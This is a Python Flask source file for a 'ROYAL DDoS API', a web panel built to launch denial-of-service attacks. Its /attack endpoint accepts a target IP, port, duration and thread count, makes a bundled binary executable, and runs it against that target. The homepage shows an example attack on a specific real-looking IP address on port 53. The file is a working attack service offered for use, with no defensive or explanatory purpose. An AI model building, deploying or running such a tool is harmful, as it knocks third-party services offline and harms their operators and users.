import os
import subprocess
import sys

# Auto install dependencies
os.system(f'{sys.executable} -m pip install flask gunicorn --quiet')

from flask import Flask, request

app = Flask(__name__)
BINARY = "/app/ddos"

@app.route('/')
def home():
    return """
    <h2>✅ ROYAL DDoS API Running</h2>
    <p>Usage: <code>/attack?ip=IP&port=PORT&time=SECONDS&threads=NUM</code></p>
    <p>Example: <a href="/attack?ip=147.75.202.61&port=53&time=60&threads=4">/attack?ip=147.75.202.61&port=53&time=60&threads=4</a></p>
    <hr>
    <small>Binary: /app/ddos | Status: Active</small>
    """

@app.route('/attack')
def attack():
    ip = request.args.get('ip')
    port = request.args.get('port')
    time = request.args.get('time')
    threads = request.args.get('threads')
    vector = request.args.get('vector', '5')
    
    if not all([ip, port, time, threads]):
        return "Error: Missing parameters (ip, port, time, threads)", 400
    
    # Make binary executable
    os.system(f'chmod +x {BINARY}')
    
    cmd = [BINARY, ip, port, time, threads, vector]
    subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    return f"""
    <h3>🔥 Attack Started</h3>
    <p>Target: {ip}:{port}<br>
    Duration: {time}s<br>
    Threads: {threads}<br>
    Vector: {vector}</p>
    <a href="/">← Back</a>
    """

if __name__ == '__main__':
    os.system(f'chmod +x {BINARY}')
    # Production server
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)
